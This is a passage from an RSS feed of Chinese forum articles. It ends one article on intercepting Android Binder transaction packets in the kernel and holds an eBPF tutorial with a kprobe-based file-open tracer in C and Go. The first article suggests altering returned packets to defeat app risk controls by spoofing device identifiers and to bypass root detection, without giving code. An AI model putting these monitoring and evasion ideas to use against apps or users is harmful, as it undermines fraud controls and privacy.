;">binder_transaction_data</code>结构体，这个结构体在native层<code style="font-family: Consolas, Monaco, ;">writeTransactionData</code>函数填充的，我们的目标通信包即是这个结构体，其中，<code style="font-family: Consolas, Monaco, ;">write_buffer</code>和<code style="font-family: Consolas, Monaco, ;">read_buffer</code>指向的数据结构大致如下：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ef599d7e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV67PT8NxKIOZmibKzbBTqaHYvjBFdib3b9j6tIJiccJqx0P8icmFUGPa46iag%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="855" /></p><p><br /></p><p><span style="font-weight: 700;">一般来说，驱动会一次性传递多条命令和地址的组合，而我们要在其中找到<code style="font-family: Consolas, Monaco, ;">binder_transaction_data</code>结构体对应的指令，在<code style="font-family: Consolas, Monaco, ;">binder.h</code>头文件中我们可以找到驱动定义的所有指令(https://android.googlesource.com/kernel/common/+/refs/heads/android-mainline/include/uapi/linux/android/binder.h)，如下图所示：</span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=036b6b8e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6Uwk4vNAGBdmbiaesoj6DI3pFtEaJf2WjeNozLwJlxzuMRk5M75rCwlA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">可以发现，<code style="font-family: Consolas, Monaco, ;">BC_TRANSACTION</code>和<code style="font-family: Consolas, Monaco, ;">BC_REPLY</code>指令都对应着<code style="font-family: Consolas, Monaco, ;">binder_transaction_data</code>结构体参数，但我们只需要客户端发往驱动的数据包，所以我们只需要<code style="font-family: Consolas, Monaco, ;">BC_TRANSACTION</code>指令对应的参数即可</span></p><p><span style="font-weight: 700;">经过上面的分析，我们找到了我们需要的核心数据---<code style="font-family: Consolas, Monaco, ;">binder_transaction_data</code>结构体，现在来看一下该结构体的定义，定义如下：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">binder_transaction_data</span> {<br />    <span style="color: rgb(150, 203, 254);">union</span> {        __u32 handle;<br />        <span style="color: rgb(255, 255, 182);">binder_uintptr_t</span> ptr;<br />    } target; <span style="color: rgb(146, 255, 184);">/* 该事务的目标对象 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_uintptr_t</span> cookie; <span style="color: rgb(146, 255, 184);">/* 只有当事务是由Binder驱动传递给用户空间时，cookie才有意思，它的值是处理该事务的Server位于C++层的本地Binder对象 */</span><br />    __u32 code; <span style="color: rgb(146, 255, 184);">/* 方法编号 */</span>    __u32 flags;<br />    <span style="color: rgb(255, 255, 182);">pid_t</span> sender_pid;<br />    <span style="color: rgb(255, 255, 182);">uid_t</span> sender_euid;<br />    <span style="color: rgb(255, 255, 182);">binder_size_t</span> data_size; <span style="color: rgb(146, 255, 184);">/* 数据长度 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_size_t</span> offsets_size; <span style="color: rgb(146, 255, 184);">/* 若包含对象，对象的数据大小 */</span><br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            <span style="color: rgb(255, 255, 182);">binder_uintptr_t</span> buffer; <span style="color: rgb(146, 255, 184);">/* 参数地址 */</span><br />            <span style="color: rgb(255, 255, 182);">binder_uintptr_t</span> offsets; <span style="color: rgb(146, 255, 184);">/* 参数对象地址 */</span>        } ptr;<br />        __u8 buf[<span style="color: rgb(255, 115, 253);">8</span>];<br />    } data; <span style="color: rgb(146, 255, 184);">/* 数据 */</span><br />};</code></pre><p><span style="font-weight: 700;">有了该数据结构，我们就可以知道客户端调用服务端的函数的函数、参数等数据了</span></p><hr /><h2>五、实现效果</h2><p><span style="font-weight: 700;">PS：整套系统用于商业，就不做开源处理了，这里只给出核心结构体打印的截图，就不再发前端的截图了</span></p><p><span style="font-weight: 700;">读取手机通讯录(ps:这里读取出来的数据采用了Toast打印的，所以将捕捉到的Toast相应的通信包也一起打印了出来，下同)：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=b2b276fe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6vJ6WlibuVk5lkvEVZL1niaPJkKfuuYg2Z8Z07L90HiaJm11icDEg9fPCQQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="927" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=131c8dae&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV649TiaBRS3jcfC7qOHJbNo2IyoG4FcicvF8oF3oWIKbI075qYVtjojhwA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="900" /></p><p><br /></p><p><span style="font-weight: 700;">获取地理位置：</span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=d4aac4af&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6yibd4gUCY1UhialaXqYsShWsqHCXXqd58jtgFhZLtgMp3AEXjIRXUv5Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="898" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a0d13361&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV65ukol6OuTyjxxjXaehMsJcW6v4YeKyiaGO2ZQVEqQwHBkddzzzgGDkA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="888" /></p><p><br /></p><p><span style="font-weight: 700;">获取wifi信息：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d418984a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6q19OlQePF151GmIK1QDiafCUoyHZ8C9TxPlLaOJggXKqZRG4AIc2DpQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="893" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=56df1583&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6V1uaHgsRAlv2H4x4nTGibofse7WRTTZnIiahkbWYs9qRpia2v9NUzFyBQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="889" /></p><p><br /></p><hr /><h2>六、其他</h2><p><span style="font-weight: 700;">上面其实我们只分析到了发送部分，反过来，其实我们也可以读取返回包甚至于修改返回包，就可用于对风控的对抗，例如在内核态中修改APP请求的设备标识信息(当然前提是app走系统提供的驱动通信)，亦或者用于逆向的工作，例如过root检测等等。</span></p><p><span style="font-weight: 700;">这部分验证代码就暂不放出来了，感兴趣的可以自己实现一下</span></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1917351-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 25 Apr 2024 17:45:53 +0800</pubDate>
</item>
<item>
<title>ebpf在Android安全上的应用：ebpf的一些基础知识(上篇)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140561&amp;idx=1&amp;sn=3b00ef83cc82b5f9e0683bf7d7a3226e&amp;chksm=bd50a1858a27289343d5d8904923428f2127589b55b9f0043c23e77ccfaedfa9c03dbdf8b6b0&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140561&amp;idx=1&amp;sn=3b00ef83cc82b5f9e0683bf7d7a3226e&amp;chksm=bd50a1858a27289343d5d8904923428f2127589b55b9f0043c23e77ccfaedfa9c03dbdf8b6b0&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 🧐 eBPF 是一种革命性的技术，可以在 Linux 内核中运行沙盒程序，扩展内核功能，无需修改内核源码。它比起传统的 kernel hook 技术，更安全、更可移植。<br />

🛠️ 可用开发工具有 bcc、libbpf、cilium、Android mk。我选用了 cilium，因为配置简单、开发便捷。<br />

📱 运行环境是基于 Android 模拟器，并在内核版本为 5.15.41 的环境中进行开发。<br />

📦 数据传输常用的框架有 perf 和 ringbuffer。在 ebpf 中还有一些常用函数如 bpf_printk、bpf_probe_read_user_str 等。<br />

🐧 通过 vmlinux.h 头文件可以避免查询内核数据结构的繁琐，使用 bpftool 可生成该文件。<br />

🔎 eBPF 中常见的事件类型有 kprobe、tracepoint。kprobe 可以在函数开始处插桩，tracepoint 是源码中的预置 hook 点。<br />

🌟 一些使用技巧包括如何将数据从用户空间传输到内核空间，以及如何获取应用程序的 UID。<br /> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-04-25 17:41</span> <span style="display: inline-block;">北京</span>
</p>

<p>eBPF 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=419331ce&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6rNG5FfOiaHkcrJbWbUFUIpL5XNuTNBVoVBm71P83icC2NQsGDKYOQXRw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>windy_ll</strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><h2>一、ebpf介绍</h2><p><span style="font-weight: 700;">eBPF 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。（PS：介绍来源于https://ebpf.io/zh-cn/what-is-ebpf/）</span></p><p><span style="font-weight: 700;">对比kernel hook，ebpf最大的优点在于安全和可移植性，在ebpf载入之前，需要经过验证器的验证，能够保证内核不会因为ebpf程序而出现崩溃，可移植性体现在多版本支持，屏蔽掉了底层的细节，能最大程度保证开发者将重心放在程序的逻辑性上；同样的，ebpf最大的缺点也体现在了为了保证安全的验证器上，例如循环次数有限制等，导致一些明明可以很简洁的操作在ebpf中编程时必须要使用很蠢的方法间接实现（ps：对kernel hook感兴趣的可以参考一下我之前的一篇文章https://www.52pojie.cn/thread-1672531-1-1.html）</span></p><hr /><h2>二、运行环境</h2><p><span style="font-weight: 700;">OS：Android模拟器pixel 6 API level 33 x86_64</span></p><p><span style="font-weight: 700;">kernel：5.15.41</span></p><hr /><h2>三、开发工具链</h2><p><span style="font-weight: 700;">ebpf常见的开发工具有如下一些：</span></p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">bcc</code>：BCC 是一个框架，它允许用户编写 python 程序，并将 eBPF 程序嵌入其中。但是bcc想将bcc运行在android上时配置环境时相对麻烦，当然，环境配置好开发难度相比其他工具更低，同时，网上的资料相比其他工具也更多</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">libbpf</code>：libbpf 是一个基于 C 的库，包含一个 BPF 加载程序，该加载程序获取已编译的 BPF 目标文件并准备它们并将其加载到 Linux 内核中。libbpf 承担了加载、验证 BPF 程序并将其附加到各种内核挂钩的繁重工作，使 BPF 应用程序开发人员能够只关注 BPF 程序的正确性和性能。官方链接：https://github.com/libbpf/libbpf</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">cilium</code>：cilium是一个纯 Go 库，提供用于加载、编译和调试 eBPF 程序的实用程序。官方链接：https://github.com/cilium/ebpf</p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">Android mk</code>：谷歌提供的android原生ebpf支撑，官方链接：https://source.android.google.cn/docs/core/architecture/kernel/bpf?hl=zh-cn</p><p><span style="font-weight: 700;">本系列文章均选择使用<code style="font-family: Consolas, Monaco, ;">cilium</code>，经过对比，<code style="font-family: Consolas, Monaco, ;">bcc</code>配置环境过于麻烦，不方便快速移植到其他设备上；<code style="font-family: Consolas, Monaco, ;">libbpf</code>和<code style="font-family: Consolas, Monaco, ;">cilium</code>对比起来，在内核层代码都是<code style="font-family: Consolas, Monaco, ;">c</code>写的，区别不大，但是在用户层代码上，<code style="font-family: Consolas, Monaco, ;">go</code>还是比<code style="font-family: Consolas, Monaco, ;">c</code>更方便编写；至于使用<code style="font-family: Consolas, Monaco, ;">android mk</code>的方式，其实最开始选用的是该方案，毕竟是<code style="font-family: Consolas, Monaco, ;">Android</code>的原生支持，不论是在数据结构上面还是在函数上面支持度相比较前面几个工具都是最优选择，缺点就是占用资源过大，性能不好的机器编译时长不是一般的长</span></p></li></ul><hr /><h2>四、ebpf中的数据传输</h2><p><span style="font-weight: 700;">ebpf中内核和用户层之间的数据传输常用的框架有两种，分别是<code style="font-family: Consolas, Monaco, ;">perf</code>和<code style="font-family: Consolas, Monaco, ;">ringbuffer</code>，前者是从<code style="font-family: Consolas, Monaco, ;">kernel module</code>而来的，而后者是专门为<code style="font-family: Consolas, Monaco, ;">ebpf</code>定制的，体验性更好，所有一般都使用后者</span>  </p><p><span style="font-weight: 700;">在内核层，常规用法为首先使用<code style="font-family: Consolas, Monaco, ;">bpf_ringbuf_reserve</code>申请一个<code style="font-family: Consolas, Monaco, ;">buffer</code>，然后调用<code style="font-family: Consolas, Monaco, ;">bpf_ringbuf_submit</code>提交数据到缓冲区，更详细的可以参考文档https://www.kernel.org/doc/html/next/bpf/ringbuf.html</span></p><hr /><h2>五、ebpf中的常见函数</h2><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">bpf_printk</code>: ebpf内核层打印函数，用法和<code style="font-family: SFMono-Regular, Consolas, ;">printf</code>一致，该函数输出到了<code style="font-family: SFMono-Regular, Consolas, ;">/sys/kernel/tracing/trace_pipe</code>文件中(PS:有些系统是/sys/kernel/debug/tracing/trace_pipe)，值得注意的是，要开启打印，需要将<code style="font-family: SFMono-Regular, Consolas, ;">/sys/kernel/tracing/tracing_on</code>的值置为1</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">bpf_probe_read_user_str</code>: 从用户空间读取字符串</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">bpf_probe_read</code>: 从内核空间读取内存, 以上函数用法都可以参考https://man7.org/linux/man-pages/man7/bpf-helpers.7.html</p></li></ul><hr /><h2>六、vmlinux.h</h2><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">vmlinux.h</code>是啥？<code style="font-family: Consolas, Monaco, ;">vmlinux.h</code>是由工具生成而来的，包含了该机器内核所有的数据结构，有了这个头文件，就避免了我们去官网上查询相应的数据结构，还能避免不同版本之间带来的数据结构变动的问题</span></p><p><span style="font-weight: 700;">通常我们使用<code style="font-family: Consolas, Monaco, ;">bpftool</code>去生成，命令为<code style="font-family: Consolas, Monaco, ;">bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</code></span></p><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">bpftool</code>的<code style="font-family: Consolas, Monaco, ;">github</code>链接为https://github.com/libbpf/bpftool</span></p><hr /><h2>七、ebpf常见的事件类型</h2><h3>7.1 kprobe</h3><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">kprobe</code>可以简单理解为在内核插桩，目前有两种形式，分别是<code style="font-family: Consolas, Monaco, ;">kprobe</code>和<code style="font-family: Consolas, Monaco, ;">kretprobe</code>，前者是在函数开始处插桩，后者则是在函数返回之前插桩，使用举例如下：</span></p><p><span style="font-weight: 700;">内核层：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">//go:build ignore</span><br /><span style="color: rgb(146, 255, 184);">#include "vmlinux.h"</span><br />char __license[] <span style="color: rgb(255, 255, 182);">SEC</span>(<span style="color: rgb(168, 255, 96);">"license"</span>) = <span style="color: rgb(168, 255, 96);">"GPL"</span>;<br /><span style="color: rgb(150, 203, 254);">struct</span> file_data {    u32 uid;<br />    u8 filename[<span style="color: rgb(255, 115, 253);">256</span>];};<br /><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(150, 203, 254);">event</span> {<br />    <span style="color: rgb(150, 203, 254);">struct</span> file_data file;};<br /><span style="color: rgb(150, 203, 254);">struct</span> {    __uint(type,BPF_MAP_TYPE_RINGBUF);<br />    __uint(max_entries,<span style="color: rgb(255, 115, 253);">1</span> &lt;&lt; <span style="color: rgb(255, 115, 253);">24</span>);<br />} events <span style="color: rgb(255, 255, 182);">SEC</span>(<span style="color: rgb(168, 255, 96);">".maps"</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(150, 203, 254);">event</span> *unused __attribute__((unused));<br />SEC(<span style="color: rgb(168, 255, 96);">"kprobe/do_sys_openat2"</span>)<br />int <span style="color: rgb(255, 255, 182);">kprobe_openat</span>(<span style="color: rgb(150, 203, 254);">struct</span> pt_regs *ctx){    u32 uid;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(150, 203, 254);">event</span> *openat2data;    char *fp = (char *)(ctx-&gt;si);    uid = bpf_get_current_uid_gid();<br />    openat2data = bpf_ringbuf_reserve(&amp;events,<span style="color: rgb(150, 203, 254);">sizeof</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(150, 203, 254);">event</span>),<span style="color: rgb(255, 115, 253);">0</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span>(!openat2data)    {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;    }<br />    long res = bpf_probe_read_user_str(&amp;openat2data-&gt;file.filename,<span style="color: rgb(255, 115, 253);">256</span>,fp);<br />    bpf_printk(<span style="color: rgb(168, 255, 96);">"uid: %d, filename: %s"</span>,uid,openat2data-&gt;file.filename);    openat2data-&gt;file.uid = uid;<br />    bpf_ringbuf_submit(openat2data,<span style="color: rgb(255, 115, 253);">0</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><hr /><p><span style="font-weight: 700;">用户层：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">package</span> main<br /><span style="color: rgb(150, 203, 254);">import</span> (<br />    <span style="color: rgb(168, 255, 96);">"log"</span><br />    <span style="color: rgb(168, 255, 96);">"os"</span><br />    <span style="color: rgb(168, 255, 96);">"os/signal"</span><br />    <span style="color: rgb(168, 255, 96);">"syscall"</span><br />    <span style="color: rgb(168, 255, 96);">"errors"</span><br />    <span style="color: rgb(168, 255, 96);">"bytes"</span><br />    <span style="color: rgb(168, 255, 96);">"encoding/binary"</span><br />    <span style="color: rgb(168, 255, 96);">"fmt"</span><br />    <span style="color: rgb(146, 255, 184);">//"github.com/cilium/ebpf"</span><br />    <span style="color: rgb(168, 255, 96);">"github.com/cilium/ebpf/link"</span><br />    <span style="color: rgb(168, 255, 96);">"github.com/cilium/ebpf/rlimit"</span><br />    <span style="color: rgb(168, 255, 96);">"github.com/cilium/ebpf/ringbuf"</span><br />    <span style="color: rgb(168, 255, 96);">"golang.org/x/sys/unix"</span>)<br /><span style="color: rgb(146, 255, 184);">//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -tags "linux" -type event --target=amd64 bpf blog.c -- -I./headers</span><br /><span style="color: rgb(150, 203, 254);">func</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    stopper := make(<span style="color: rgb(150, 203, 254);">chan</span> os.Signal,<span style="color: rgb(255, 115, 253);">1</span>)    signal.Notify(stopper,os.Interrupt,syscall.SIGTERM)<br />    <span style="color: rgb(150, 203, 254);">if</span> err := rlimit.RemoveMemlock(); err != <span style="color: rgb(198, 197, 254);">nil</span> {        log.Fatal(err);    }    objs := bpfObjects{}<br />    <span style="color: rgb(150, 203, 254);">if</span> err := loadBpfObjects(&amp;objs,<span style="color: rgb(198, 197, 254);">nil</span>); err != <span style="color: rgb(198, 197, 254);">nil</span> {        log.Fatal(err);    }<br />    <span style="color: rgb(150, 203, 254);">defer</span> objs.Close()<br />    se, err := link.Kprobe(<span style="color: rgb(168, 255, 96);">"do_sys_openat2"</span>,objs.KprobeOpenat,<span style="color: rgb(198, 197, 254);">nil</span>)<br />    <span style="color: rgb(150, 203, 254);">if</span> err != <span style="color: rgb(198, 197, 254);">nil</span> {        log.Fatal(err)    }<br />    <span style="color: rgb(150, 203, 254);">defer</span> se.Close()    rd, err := ringbuf.NewReader(objs.Events)<br />    <span style="color: rgb(150, 203, 254);">if</span> err != <span style="color: rgb(198, 197, 254);">nil</span> {        log.Fatal(err)    }<br />    <span style="color: rgb(150, 203, 254);">defer</span> rd.Close()<br />    <span style="color: rgb(150, 203, 254);">go</span> <span style="color: rgb(150, 203, 254);">func</span>() {        &lt;-stopper<br />        <span style="color: rgb(150, 203, 254);">if</span> err := rd.Close(); err != <span style="color: rgb(198, 197, 254);">nil</span> {            log.Fatal(err)        }    }()<br />    log.Println(<span style="color: rgb(168, 255, 96);">"Waiting for Data"</span>)<br />    <span style="color: rgb(150, 203, 254);">var</span> event bpfEvent<br />    <span style="color: rgb(150, 203, 254);">for</span> {        record, err := rd.Read()<br />        <span style="color: rgb(150, 203, 254);">if</span> err != <span style="color: rgb(198, 197, 254);">nil</span> {<br />            <span style="color: rgb(150, 203, 254);">if</span> errors.Is(err,ringbuf.ErrClosed) {<br />                log.Println(<span style="color: rgb(168, 255, 96);">"Received signal, exiting..."</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span>            }            log.Fatal(err)<br />            <span style="color: rgb(150, 203, 254);">continue</span>        }<br />        <span style="color: rgb(150, 203, 254);">if</span> err := binary.Read(bytes.NewBuffer(record.RawSample),binary.LittleEndian,&amp;event); err != <span style="color: rgb(198, 197, 254);">nil</span> {            log.Fatal(err)<br />            <span style="color: rgb(150, 203, 254);">continue</span>        }<br />        fmt.Printf(<span style="color: rgb(168, 255, 96);">"[%+v]: filename -&gt; %s\n"</span>,event.File.Uid,unix.ByteSliceToString(event.File.Filename[:]))    }<br />}</code></pre><p><span style="font-weight: 700;">编译：先<code style="font-family: Consolas, Monaco, ;">go generate</code>，然后<code style="font-family: Consolas, Monaco, ;">go build</code>即可</span></p><p><span style="font-weight: 700;">效果图如下：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=563a90eb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6jO5ycZAtTjFMcS7cgvWUoSo0rOpDYzJgITOH9S0vyVt9mKHWcEIJlA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1068" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=c39a0450&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6Wj2BYq9lBGb9j5nB8M4IWhNJaQnUfnJkdzQFwicibOdupkvJ61kz0Q5Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="684" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d917ece8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV66zQ28FNB3oOicu6Cic4oq8ew7ZFA4vEJ8vBDkev9XXH92T5YwBXAW9OQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 